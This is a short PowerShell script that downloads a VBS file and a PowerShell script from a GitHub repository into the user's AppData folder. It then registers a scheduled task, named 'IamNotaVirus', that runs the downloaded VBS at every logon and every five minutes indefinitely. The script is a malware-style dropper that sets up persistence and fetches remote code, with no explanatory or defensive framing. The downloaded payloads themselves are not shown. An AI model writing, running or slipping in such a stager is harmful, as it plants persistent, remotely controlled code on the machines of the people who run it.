Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/runLowPriv.vbs' -UseBasicParsing -OutFile $env:appdata\runLowPriv.vbs
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/basic.ps1' -UseBasicParsing -OutFile $env:appdata\basic.ps1
$repeat = (New-TimeSpan -Minutes 5)
$trigger = @(
	$(New-JobTrigger -AtLogOn),
	$(New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat)
)
$Action = New-ScheduledTaskAction -Execute "$env:appdata\runLowPriv.vbs"
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $trigger -Settings $Settings
Register-ScheduledTask -TaskName 'IamNotaVirus' -InputObject $Task -Force
# $Action = New-ScheduledTaskAction -Execute 'cscript.exe' -Argument "$env:appdata\run.vbs" 
